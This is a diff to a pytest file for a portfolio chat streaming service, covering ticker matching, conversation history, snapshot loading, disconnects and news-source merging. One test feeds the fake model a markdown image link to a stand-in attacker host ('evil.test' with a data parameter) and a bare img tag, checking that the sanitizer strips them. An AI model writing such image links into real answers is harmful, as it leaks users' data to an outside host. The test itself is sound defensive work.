@@ -20,6 +20,7 @@ from services.portfolio_chat import (
 )
 from services.portfolio_chat_context import PortfolioSnapshot, build_answer_prompt, format_context
 from services.portfolio_performance import EurSeries
+from utils.chat_prompt import format_conversation
 
 
 def row(ticker, value, weight, day_change, day_pct, **extra):
@@ -153,7 +154,32 @@ def test_mentioned_holdings_short_ticker_with_dollar_and_hyphenated_brand():
     coke = row("KO", 1.0, 1.0, 0.0, 0.0, name="Coca-Cola Co")
 
     assert mentioned_holdings("How is $A doing?", [agilent]) == [agilent]
+    assert mentioned_holdings("How is $ABNB doing?", [agilent]) == []
     assert mentioned_holdings("Why is Coca-Cola down?", [coke]) == [coke]
+
+
+@pytest.mark.parametrize("question", ["Why did Nokia's shares drop?", "Why did Nokia’s shares drop?"])
+def test_mentioned_holdings_matches_possessive_names(question):
+    assert [r["ticker"] for r in mentioned_holdings(question, ROWS)] == ["NOKIA.HE"]
+
+
+def test_format_conversation_keeps_last_six_and_collapses_whitespace():
+    messages = [{"role": "user", "content": f"q{i}"} for i in range(8)] + [
+        {"role": "assistant", "content": "line one\n\n  line two"},
+        {"role": "", "content": "no role"},
+        {"role": "user", "content": None},
+    ]
+
+    text = format_conversation(messages)
+
+    assert text.splitlines() == [
+        "Recent conversation:",
+        "USER: q5",
+        "USER: q6",
+        "USER: q7",
+        "ASSISTANT: line one line two",
+    ]
+    assert format_conversation(None) == ""
 
 
 def test_search_targets_scope_then_named_then_biggest_movers():
@@ -182,6 +208,7 @@ EMPTY_HOLDINGS = SimpleNamespace(list_holdings=lambda user_id: [])
 @pytest.mark.asyncio
 async def test_load_snapshot_combines_portfolio_returns_risk_and_exclusions():
     with (
+        patch.object(portfolio_chat, "get_quotes", return_value={}),
         patch.object(portfolio_chat, "get_portfolio", return_value={"summary": SUMMARY, "holdings": ROWS}),
         patch.object(portfolio_chat, "load_eur_series", return_value=(_tiny_series(), ["NOKIA.HE"])),
     ):
@@ -196,6 +223,7 @@ async def test_load_snapshot_combines_portfolio_returns_risk_and_exclusions():
 @pytest.mark.asyncio
 async def test_load_snapshot_keeps_concentration_when_price_history_fails():
     with (
+        patch.object(portfolio_chat, "get_quotes", return_value={}),
         patch.object(portfolio_chat, "get_portfolio", return_value={"summary": SUMMARY, "holdings": ROWS}),
         patch.object(portfolio_chat, "load_eur_series", side_effect=RuntimeError("yahoo down")),
     ):
@@ -209,6 +237,7 @@ async def test_load_snapshot_keeps_concentration_when_price_history_fails():
 @pytest.mark.asyncio
 async def test_load_snapshot_survives_risk_failure():
     with (
+        patch.object(portfolio_chat, "get_quotes", return_value={}),
         patch.object(portfolio_chat, "get_portfolio", return_value={"summary": SUMMARY, "holdings": ROWS}),
         patch.object(portfolio_chat, "load_eur_series", return_value=(_tiny_series(), [])),
         patch.object(portfolio_chat, "compute_risk", side_effect=ValueError("bad maths")),
@@ -222,6 +251,7 @@ async def test_load_snapshot_survives_risk_failure():
 @pytest.mark.asyncio
 async def test_load_snapshot_raises_when_portfolio_fails():
     with (
+        patch.object(portfolio_chat, "get_quotes", return_value={}),
         patch.object(portfolio_chat, "get_portfolio", side_effect=RuntimeError("db down")),
         patch.object(portfolio_chat, "load_eur_series", return_value=(None, [])),
         pytest.raises(PortfolioUnavailableError),
@@ -241,11 +271,16 @@ async def test_resolve_scope_normalises_and_checks_holdings():
         await service.resolve_scope("user-1", "AAPL")
 
 
+ANSWER = ["TSLA fell on delivery news.", "\n\nNot financial advice."]
+
+
 class FakeAgent:
     prompts: list[str] = []
     models: list = []
     route = "portfolio_only"
-    answer = ["TSLA fell on delivery news.", "\n\nNot financial advice."]
+    answer = ANSWER
+    # Set once the consumer asks for the second answer chunk, i.e. after the first was handled.
+    first_chunk_consumed = False
 
     def __init__(self, model_name):
         self.model_name = model_name
@@ -256,7 +291,14 @@ class FakeAgent:
         if "strict JSON classifier" in prompt:
             yield self.route
             return
-        yield from self.answer
+        for i, chunk in enumerate(self.answer):
+            if i == 1:
+                FakeAgent.first_chunk_consumed = True
+            yield chunk
+
+
+def answer_text(events) -> str:
+    return "".join(e["body"] for e in events if e["type"] == "answer")
 
 
 async def _connected():
@@ -269,10 +311,14 @@ async def collect(
     route='{"route":"portfolio_only"}',
     snap=None,
     is_disconnected=_connected,
+    history=(),
 ):
     FakeAgent.prompts = []
     FakeAgent.models = []
     FakeAgent.route = route
+    FakeAgent.first_chunk_consumed = False
+    rows = snap.portfolio["holdings"] if isinstance(snap, PortfolioSnapshot) else ROWS
+    holdings = SimpleNamespace(list_holdings=lambda user_id: [SimpleNamespace(ticker=r["ticker"]) for r in rows])
 
     async def fake_load(*args):
         if snap is None:
@@ -284,13 +330,13 @@ async def collect(
     with (
         patch.object(portfolio_chat, "MultiAgent", FakeAgent),
         patch.object(portfolio_chat, "load_snapshot", fake_load),
-        patch.object(portfolio_chat, "get_conversation_history_for_prompt", return_value=[]),
+        patch.object(portfolio_chat, "get_conversation_history_for_prompt", return_value=list(history)),
         patch.object(portfolio_chat, "append_user_message") as append_user,
         patch.object(portfolio_chat, "append_assistant_message") as append_assistant,
     ):
         events = [
             e
-            async for e in PortfolioChatStreamService(None, None, brave_client=object()).stream(
+            async for e in PortfolioChatStreamService(holdings, None, brave_client=object()).stream(
                 user_id="user-1",
                 question=question,
                 scope_ticker=scope_ticker,
@@ -309,7 +355,7 @@ async def test_portfolio_only_answer_grounded_in_context():
     types = [e["type"] for e in events]
     assert types[0] == "conversation"
     assert events[0]["body"] == {"conversationId": "conv-1"}
-    assert [e["body"] for e in events if e["type"] == "answer"] == FakeAgent.answer
+    assert answer_text(events) == "".join(ANSWER)
     assert types[-1] == "model_used"
     assert "sources" not in types
     statuses = [e["body"] for e in events if e["type"] == "thinking_status"]
@@ -322,9 +368,18 @@ async def test_portfolio_only_answer_grounded_in_context():
     assert 'End with a separate final line exactly: "Not financial advice."' in prompt
     assert "position; the rest of the portfolio is for reference" not in prompt
     append_user.assert_called_once_with("user-1", CONVERSATION_SCOPE, "conv-1", "How am I doing?")
-    append_assistant.assert_called_once_with(
-        "user-1", CONVERSATION_SCOPE, "conv-1", "TSLA fell on delivery news.\n\nNot financial advice."
-    )
+    append_assistant.assert_called_once_with("user-1", CONVERSATION_SCOPE, "conv-1", "".join(ANSWER))
+
+
+@pytest.mark.asyncio
+async def test_history_reaches_classifier_and_answer_prompts():
+    history = [{"role": "user", "content": "How is TSLA?"}, {"role": "assistant", "content": "Down 7%."}]
+
+    await collect(question="And Apple?", history=history)
+
+    classifier_prompt, answer_prompt = FakeAgent.prompts
+    for prompt in (classifier_prompt, answer_prompt):
+        assert "Recent conversation:\nUSER: How is TSLA?\nASSISTANT: Down 7%." in prompt
 
 
 def test_conversation_scope_cannot_be_a_ticker():
@@ -358,28 +413,30 @@ async def test_unrelated_question_gets_redirect_without_answer_call():
 
 
 @pytest.mark.asyncio
-async def test_visual_blocks_are_not_split_out_of_the_answer():
-    FakeAgent.answer = ["```html\n<img src=x>\n```"]
-    try:
-        events, _, _ = await collect()
-    finally:
-        FakeAgent.answer = ["TSLA fell on delivery news.", "\n\nNot financial advice."]
+async def test_answer_is_sanitized_before_streaming_and_storing(monkeypatch):
+    monkeypatch.setattr(
+        FakeAgent,
+        "answer",
+        ["Up 2% ![x](https://evil.te", "st/?d=63313) see [Reuters](https://r.com) ", "<img src=x> done.\n```html\n```"],
+    )
 
+    events, _, append_assistant = await collect()
+
+    text = answer_text(events)
+    assert text == "Up 2%  see Reuters  done.\n```html\n```"
     assert not any(e["type"].startswith("answer_visual") for e in events)
+    append_assistant.assert_called_once_with("user-1", CONVERSATION_SCOPE, "conv-1", text)
 
 
 @pytest.mark.asyncio
 async def test_disconnect_mid_answer_stops_without_persisting():
-    calls = {"n": 0}
+    async def dropped_after_first_chunk():
+        return FakeAgent.first_chunk_consumed
 
-    async def drop_after_first_chunk():
-        calls["n"] += 1
-        # 1: after search step, 2: first chunk, 3: second chunk.
-        return calls["n"] >= 3
+    events, _, append_assistant = await collect(is_disconnected=dropped_after_first_chunk)
 
-    events, _, append_assistant = await collect(is_disconnected=drop_after_first_chunk)
-
-    assert [e["body"] for e in events if e["type"] == "answer"] == ["TSLA fell on delivery news."]
+    assert answer_text(events)
+    assert answer_text(events) != "".join(ANSWER)
     assert "model_used" not in [e["type"] for e in events]
     append_assistant.assert_not_called()
 
@@ -461,3 +518,36 @@ async def test_portfolio_unavailable_emits_error():
 
     assert events[-1] == {"type": "error", "code": "portfolio_unavailable", "body": "Couldn't load your portfolio"}
     append_assistant.assert_not_called()
+
+
+@pytest.mark.asyncio
+async def test_needs_search_without_any_target_skips_search():
+    with patch.object(portfolio_chat, "retrieve_for_analyze") as retrieve:
+        events, _, _ = await collect(
+            question="Why the drop?", route='{"route":"needs_search"}', snap=snapshot(rows=[ROWS[3]])
+        )
+
+    retrieve.assert_not_called()
+    assert not any(e["body"].startswith("Searching") for e in events if e["type"] == "thinking_status")
+    assert "<news_results>" not in FakeAgent.prompts[-1]
+    assert "News search found no relevant" not in FakeAgent.prompts[-1]
+
+
+@pytest.mark.asyncio
+async def test_two_holding_search_merges_and_dedupes_sources():
+    def fake_retrieve(**kwargs):
+        own = _source(f"only-{kwargs['ticker']}")
+        return AnalyzeRetrievalResult(
+            sources=[_source("shared"), own],
+            selected_passages=[],
+            query=kwargs["question"],
+            market=kwargs["market"],
+            request_id=kwargs["request_id"],
+        )
+
+    with patch.object(portfolio_chat, "retrieve_for_analyze", side_effect=fake_retrieve):
+        events, _, _ = await collect(question="Explain today's move", route='{"route":"needs_search"}')
+
+    ids = [s["source_id"] for s in next(e["body"] for e in events if e["type"] == "sources")]
+    assert sorted(ids) == ["only-AAPL", "only-TSLA", "shared"]
+    assert FakeAgent.prompts[-1].count("Source [") == 3
